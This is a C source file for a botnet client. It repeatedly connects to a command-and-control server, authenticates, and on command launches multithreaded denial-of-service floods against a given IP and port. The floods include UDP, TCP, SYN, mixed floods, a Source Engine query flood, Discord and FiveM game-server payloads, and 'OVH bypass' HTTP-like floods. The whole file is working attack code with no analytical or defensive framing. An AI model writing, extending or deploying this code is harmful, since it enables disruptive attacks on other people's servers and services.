#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>

// Configuration
#define C2_ADDRESS "your ip vps"
#define C2_PORT 1337
#define MAX_USERS 50
#define MAX_ATTACKS_PER_USER 10
#define BUFFER_SIZE 2048
#define MAX_THREADS 1000

// Payloads
unsigned char payload_vse[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
unsigned char payload_discord2[] = "\x94\x00\xb0\x1a\xef\x69\xa8\xa1\x59\x69\xba\xc5\x08\x00\x45\x00\x00\x43\xf0\x12\x00\x00\x80\x11\x00\x00\xc0\xa8\x64\x02\xb9\x29\x8e\x31\xc2\x30\xc3\x51\x00\x2f\x6c\x46\x90\xf8\x5f\x1b\x8e\xf5\x56\x8f\x00\x05\xe1\x26\x96\xa9\xde\xe8\x84\xba\x65\x38\x70\x68\xf5\x70\x0e\x12\xe2\x54\x20\xe0\x7f\x49\x0d\x9e\x44\x89\xec\x4b\x7f";
unsigned char payload_fivem[] = "\x74\x6f\x6b\x65\x6e\x3d\x64\x66\x39\x36\x61\x66\x30\x33\x2d\x63\x32\x66\x63\x2d\x34\x63\x32\x39\x2d\x39\x31\x39\x61\x2d\x32\x36\x30\x35\x61\x61\x37\x30\x62\x31\x66\x38\x26\x67\x75\x69\x64\x3d\x37\x36\x35\x36\x31\x31\x39\x38\x38\x30\x34\x38\x30\x36\x30\x31\x35";

int hex_values[] = {2, 4, 8, 16, 32, 64, 128};
int hex_count = 7;

int packet_sizes[] = {1024, 2048};
int packet_sizes_count = 2;

// Thread control structure
typedef struct {
    pthread_t thread_id;
    int active;
    int stop;
} attack_thread_t;

// User attack tracking
typedef struct {
    char username[32];
    attack_thread_t attacks[MAX_ATTACKS_PER_USER];
    int attack_count;
} user_attack_t;

user_attack_t user_attacks[MAX_USERS];
int user_count = 0;

// Function prototypes
void *attack_ovh_tcp(void *arg);
void *attack_ovh_udp(void *arg);
void *attack_vse(void *arg);
void *attack_discord2(void *arg);
void *attack_fivem(void *arg);
void *attack_udp_bypass(void *arg);
void *attack_tcp_bypass(void *arg);
void *attack_tcp_udp_bypass(void *arg);
void *attack_syn(void *arg);
void start_attack(const char *method, const char *ip, int port, int duration, int thread_count, const char *username);
void stop_attacks(const char *username);
char *get_architecture();
void generate_random_data(unsigned char *buffer, int size);
char *generate_end(int length);

// Attack parameters structure
typedef struct {
    char ip[128];
    int port;
    time_t end_time;
    int *stop_flag;
} attack_params_t;

// Get system architecture
char *get_architecture() {
    static char arch[64];
    FILE *fp;

    fp = popen("uname -m", "r");
    if (fp == NULL) {
        strcpy(arch, "unknown");
    } else {
        if (fgets(arch, sizeof(arch) - 1, fp) != NULL) {
            // Remove newline
            arch[strcspn(arch, "\n")] = 0;
        } else {
            strcpy(arch, "unknown");
        }
        pclose(fp);
    }

    return arch;
}


// Generate random data
void generate_random_data(unsigned char *buffer, int size) {
    for (int i = 0; i < size; i++) {
        buffer[i] = rand() % 256;
    }
}

// Generate end string
char *generate_end(int length) {
    static char end[16];
    const char chars[] = "\n\r";

    for (int i = 0; i < length; i++) {
        end[i] = chars[rand() % 2];
    }
    end[length] = '\0';

    return end;
}

// OVH packet builder
char **ovh_builder(const char *ip, int port, int *count) {
    char **packet_list = (char **)malloc(sizeof(char *) * 1000); // Allocate space for up to 1000 packets
    int packet_count = 0;

    for (int h2_idx = 0; h2_idx < hex_count; h2_idx++) {
        for (int h_idx = 0; h_idx < hex_count; h_idx++) {
            // Generate random part (2048 bytes)
            unsigned char random_part[2048];
            generate_random_data(random_part, 2048);

            const char *paths[] = {
                "/0/0/0/0/0/0",
                "/0/0/0/0/0/0/",
                "\\0\\0\\0\\0\\0\\0",
                "\\0\\0\\0\\0\\0\\0\\"
            };

            for (int p = 0; p < 4; p++) {
                char *end = generate_end(4);
                char *packet = (char *)malloc(4096); // Allocate enough space for packet

                snprintf(packet, 4096, "PGET %s%.*s HTTP/1.1\nHost: %s:%d%s",
                         paths[p],
                         256, // Limit random part to 256 bytes for simplicity
                         (char *)random_part,
                         ip,
                         port,
                         end);

                packet_list[packet_count++] = packet;

                if (packet_count >= 1000) {
                    *count = packet_count;
                    return packet_list;
                }
            }
        }
    }

    *count = packet_count;
    return packet_list;
}

// Attack functions
void *attack_ovh_tcp(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock, sock2;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    int packet_count;
    char **packets = ovh_builder(params->ip, params->port, &packet_count);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        sock2 = socket(AF_INET, SOCK_STREAM, 0);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) >= 0) {
            connect(sock2, (struct sockaddr *)&server, sizeof(server));

            for (int i = 0; i < packet_count; i++) {
                for (int j = 0; j < 10; j++) {
                    send(sock, packets[i], strlen(packets[i]), 0);
                    send(sock2, packets[i], strlen(packets[i]), 0);
                }
            }
        }

        close(sock);
        close(sock2);
    }

    // Free packets
    for (int i = 0; i < packet_count; i++) {
        free(packets[i]);
    }
    free(packets);

    free(params);
    return NULL;
}

void *attack_ovh_udp(void *arg) {
    printf("[DEBUG] OVH-UDP ataque iniciado\n");
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    int packet_count;
    char **packets = ovh_builder(params->ip, params->port, &packet_count);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);

        for (int i = 0; i < packet_count; i++) {
            for (int j = 0; j < 10; j++) {
                sendto(sock, packets[i], strlen(packets[i]), 0,
                       (struct sockaddr *)&server, sizeof(server));
            }
        }

        close(sock);
    }

    // Free packets
    for (int i = 0; i < packet_count; i++) {
        free(packets[i]);
    }
    free(packets);

    free(params);
    return NULL;
}

void *attack_vse(void *arg) {
    printf("[DEBUG] VSE ataque iniciado\n");
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);

        sendto(sock, payload_vse, sizeof(payload_vse), 0,
               (struct sockaddr *)&server, sizeof(server));

        close(sock);
    }

    free(params);
    return NULL;
}

// Discord attack function
void *attack_discord2(void *arg) {
    printf("[DEBUG] Discord2 ataque iniciado\n");
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);

        // Send the discord2 payload
        sendto(sock, payload_discord2, sizeof(payload_discord2) - 1, 0,
               (struct sockaddr *)&server, sizeof(server));

        close(sock);
    }
    printf("[DEBUG] Discord2 ataque parado\n");

    free(params);
    return NULL;
}

void *attack_fivem(void *arg) {
    printf("[DEBUG] fivem ataque iniciado\n");
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);

        // Send the fivem payload
        sendto(sock, payload_fivem, sizeof(payload_fivem) - 1, 0,
               (struct sockaddr *)&server, sizeof(server));

        close(sock);
    }
    printf("[DEBUG] fivem ataque parado\n");

    free(params);
    return NULL;
}

void *attack_udp_bypass(void *arg) {
    printf("[DEBUG] UDP ataque iniciado\n");
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char *packet;
    int packet_size;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_DGRAM, 0);

        packet_size = packet_sizes[rand() % packet_sizes_count];
        packet = (unsigned char *)malloc(packet_size);
        generate_random_data(packet, packet_size);

        sendto(sock, packet, packet_size, 0,
               (struct sockaddr *)&server, sizeof(server));

        free(packet);
        close(sock);
    }
    printf("[DEBUG] UDP ataque parado\n");

    free(params);
    return NULL;
}

void *attack_tcp_bypass(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char *packet;
    int packet_size;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_STREAM, 0);

        packet_size = packet_sizes[rand() % packet_sizes_count];
        packet = (unsigned char *)malloc(packet_size);
        generate_random_data(packet, packet_size);

        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) >= 0) {
            while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
                send(sock, packet, packet_size, 0);
            }
        }

        free(packet);
        close(sock);
    }

    free(params);
    return NULL;
}

void *attack_tcp_udp_bypass(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char *packet;
    int packet_size;
    int use_tcp;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        use_tcp = rand() % 2;

        if (use_tcp) {
            sock = socket(AF_INET, SOCK_STREAM, 0);
        } else {
            sock = socket(AF_INET, SOCK_DGRAM, 0);
        }

        packet_size = packet_sizes[rand() % packet_sizes_count];
        packet = (unsigned char *)malloc(packet_size);
        generate_random_data(packet, packet_size);

        if (use_tcp) {
            if (connect(sock, (struct sockaddr *)&server, sizeof(server)) >= 0) {
                send(sock, packet, packet_size, 0);
            }
        } else {
            sendto(sock, packet, packet_size, 0,
                   (struct sockaddr *)&server, sizeof(server));
        }

        free(packet);
        close(sock);
    }

    free(params);
    return NULL;
}

void *attack_syn(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;
    int sock;
    struct sockaddr_in server;
    unsigned char *packet;
    int packet_size;
    int flags;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(params->ip);
    server.sin_port = htons(params->port);

    while (time(NULL) < params->end_time && !(*(params->stop_flag))) {
        sock = socket(AF_INET, SOCK_STREAM, 0);

        // Set non-blocking
        flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        packet_size = packet_sizes[rand() % packet_sizes_count];
        packet = (unsigned char *)malloc(packet_size);
        generate_random_data(packet, packet_size);

        connect(sock, (struct sockaddr *)&server, sizeof(server));
        send(sock, packet, packet_size, 0);

        free(packet);
        close(sock);
    }

    free(params);
    return NULL;
}

// Start an attack with specified method
void start_attack(const char *method, const char *ip, int port, int duration, int thread_count, const char *username) {
    int i, user_index = -1;
    
    printf("[DEBUG] start_attack called with method=%s, ip=%s, port=%d, duration=%d, threads=%d, user=%s\n", 
           method, ip, port, duration, thread_count, username);

    // Find or create user
    for (i = 0; i < user_count; i++) {
        if (strcmp(user_attacks[i].username, username) == 0) {
            user_index = i;
            printf("[DEBUG] Found existing user at index %d\n", user_index);
            break;
        }
    }

    if (user_index == -1) {
        if (user_count >= MAX_USERS) {
            printf("[ERROR] Too many users, cannot add new user\n");
            return; // Too many users
        }

        user_index = user_count++;
        strcpy(user_attacks[user_index].username, username);
        user_attacks[user_index].attack_count = 0;
        printf("[DEBUG] Created new user at index %d\n", user_index);
    }

    // Check if user already has max attacks
    if (user_attacks[user_index].attack_count >= MAX_ATTACKS_PER_USER) {
        printf("[ERROR] User %s already has maximum number of attacks (%d)\n", 
               username, MAX_ATTACKS_PER_USER);
        return;
    }

    // Find empty thread slot
    int attack_index = user_attacks[user_index].attack_count;
    printf("[DEBUG] Using attack index %d for new attack\n", attack_index);

    // Initialize stop flag
    user_attacks[user_index].attacks[attack_index].stop = 0;
    user_attacks[user_index].attacks[attack_index].active = 1;

    // Choose attack function based on method
    void *(*attack_func)(void *) = NULL;

    if (strcmp(method, ".udp") == 0) {
        printf("[DEBUG] Selected UDP attack method\n");
        attack_func = attack_udp_bypass;
    } else if (strcmp(method, ".tcp") == 0) {
        printf("[DEBUG] Selected TCP attack method\n");
        attack_func = attack_tcp_bypass;
    } else if (strcmp(method, ".mix") == 0) {
        printf("[DEBUG] Selected MIX attack method\n");
        attack_func = attack_tcp_udp_bypass;
    } else if (strcmp(method, ".syn") == 0) {
        printf("[DEBUG] Selected SYN attack method\n");
        attack_func = attack_syn;
    } else if (strcmp(method, ".vse") == 0) {
        printf("[DEBUG] Selected VSE attack method\n");
        attack_func = attack_vse;
    } else if (strcmp(method, ".discord") == 0) {
        printf("[DEBUG] Selected Discord2 attack method\n");
        attack_func = attack_discord2;
    } else if (strcmp(method, ".fivem") == 0) {
        printf("[DEBUG] Selected fivem attack method\n");
        attack_func = attack_fivem;
    } else if (strcmp(method, ".ovhtcp") == 0) {
        printf("[DEBUG] Selected OVHTCP attack method\n");
        attack_func = attack_ovh_tcp;
    } else if (strcmp(method, ".ovhudp") == 0) {
        printf("[DEBUG] Selected OVHUDP attack method\n");
        attack_func = attack_ovh_udp;
    } else {
        printf("[ERROR] Unknown attack method: %s\n", method);
        return;
    }

    if (attack_func == NULL) {
        printf("[ERROR] Failed to assign attack function\n");
        return;
    }

    printf("[DEBUG] Starting %d attack threads\n", thread_count);
    int successful_threads = 0;

    // Start all threads
    for (i = 0; i < thread_count && i < MAX_THREADS; i++) {
        attack_params_t *thread_params = (attack_params_t *)malloc(sizeof(attack_params_t));
        if (thread_params == NULL) {
            printf("[ERROR] Failed to allocate memory for thread parameters\n");
            continue;
        }
        
        strncpy(thread_params->ip, ip, sizeof(thread_params->ip)-1);
        thread_params->ip[sizeof(thread_params->ip)-1] = '\0';
        thread_params->port = port;
        thread_params->end_time = time(NULL) + duration;
        thread_params->stop_flag = &user_attacks[user_index].attacks[attack_index].stop;

        int result = pthread_create(&user_attacks[user_index].attacks[attack_index].thread_id,
                               NULL, attack_func, thread_params);
                               
        if (result != 0) {
            printf("[ERROR] Failed to create thread %d: error code %d\n", i, result);
            free(thread_params);
        } else {
            successful_threads++;
        }
    }

    if (successful_threads > 0) {
        user_attacks[user_index].attack_count++;
        printf("[SUCCESS] Started attack with %d/%d threads\n", successful_threads, thread_count);
    } else {
        printf("[ERROR] Failed to start any attack threads\n");
    }
}


// Stop all attacks for a user
void stop_attacks(const char *username) {
    int i, user_index = -1;

    // Find user
    for (i = 0; i < user_count; i++) {
        if (strcmp(user_attacks[i].username, username) == 0) {
            user_index = i;
            break;
        }
    }

    if (user_index == -1) {
        return; // User not found
    }

    // Set stop flags for all attacks
    for (i = 0; i < user_attacks[user_index].attack_count; i++) {
        user_attacks[user_index].attacks[i].stop = 1;
        pthread_join(user_attacks[user_index].attacks[i].thread_id, NULL);
    }

    user_attacks[user_index].attack_count = 0;
}

// Main function
int main() {
    printf("main function ...\n");
    int c2_sock, new_sock, c;
    struct sockaddr_in server, client;
    char buffer[BUFFER_SIZE];
    int connected = 0;

    // Initialize random seed
    srand(time(NULL));

    // Initialize the user_attacks array
    memset(user_attacks, 0, sizeof(user_attacks));

    // Ignore SIGPIPE to prevent crashes on socket write errors
    signal(SIGPIPE, SIG_IGN);

    while (1) {
        c2_sock = socket(AF_INET, SOCK_STREAM, 0);
        if (c2_sock < 0) {
            sleep(20);
            continue;
        }

        int option = 1;
        setsockopt(c2_sock, SOL_SOCKET, SO_KEEPALIVE, &option, sizeof(option));

        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(C2_ADDRESS);
        server.sin_port = htons(C2_PORT);

        if (connect(c2_sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            close(c2_sock);
            sleep(20);
            continue;
        }
        
        // Wait for Username prompt
        sleep(1);
        printf("Wait for Username prompt ...\n");
        memset(buffer, 0, BUFFER_SIZE);
        recv(c2_sock, buffer, BUFFER_SIZE, 0);
        
        if (strstr(buffer, "Username") != NULL) {
            // Send architecture
            
            printf("get_architecture ...\n");
            char *arch = get_architecture();
            send(c2_sock, arch, strlen(arch), 0);

            // Wait for Password prompt
            memset(buffer, 0, BUFFER_SIZE);
            recv(c2_sock, buffer, BUFFER_SIZE, 0);

            if (strstr(buffer, "Password") != NULL) {
                // Send special password packet
                unsigned char passwd[] = "\xff\xff\xff\xff\75";
                send(c2_sock, passwd, 5, 0);

                printf("connected!\n");
                connected = 1;
            }
        }

        if (connected) {
            printf("connected = 1\n");
            while (1) {
                memset(buffer, 0, BUFFER_SIZE);
                int recv_size = recv(c2_sock, buffer, BUFFER_SIZE, 0);
                
                if (recv_size <= 0) {
                    break;
                }
                
                // Remove newline
                buffer[strcspn(buffer, "\n")] = 0;
                buffer[strcspn(buffer, "\r")] = 0;

                // Parse command
                char command[64] = {0};
                char ip[128] = {0};
                int port = 0, duration = 0, threads = 0;
                char username[32] = "default";

                // Command parsing
                char *token = strtok(buffer, " ");
                if (token != NULL) {
                    strncpy(command, token, sizeof(command)-1);

                    if (strcmp(command, "PING") == 0) {
                        send(c2_sock, "PONG", 4, 0);
                    } else if (strcmp(command, "STOP") == 0) {
                        token = strtok(NULL, " ");
                        if (token != NULL) {
                            stop_attacks(token);
                        }
                    } else {
                        // Treat as attack command
                        // Format: METHOD IP PORT SECONDS THREADS [USERNAME]
                        token = strtok(NULL, " ");
                        if (token != NULL) {
                            strncpy(ip, token, sizeof(ip)-1);

                            token = strtok(NULL, " ");
                            if (token != NULL) {
                                port = atoi(token);

                                token = strtok(NULL, " ");
                                if (token != NULL) {
                                    duration = atoi(token);

                                    token = strtok(NULL, " ");
                                    if (token != NULL) {
                                        threads = atoi(token);

                                        token = strtok(NULL, " ");
                                        if (token != NULL) {
                                            strncpy(username, token, sizeof(username)-1);
                                        }

                                        // Start attack
                                        //printf("ataque recebido! %s %s %d %d %d %s\n", command, ip, port, duration, threads, username);
                                        start_attack(command, ip, port, duration, threads, username);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        close(c2_sock);
        connected = 0;
    }

    return 0;
}
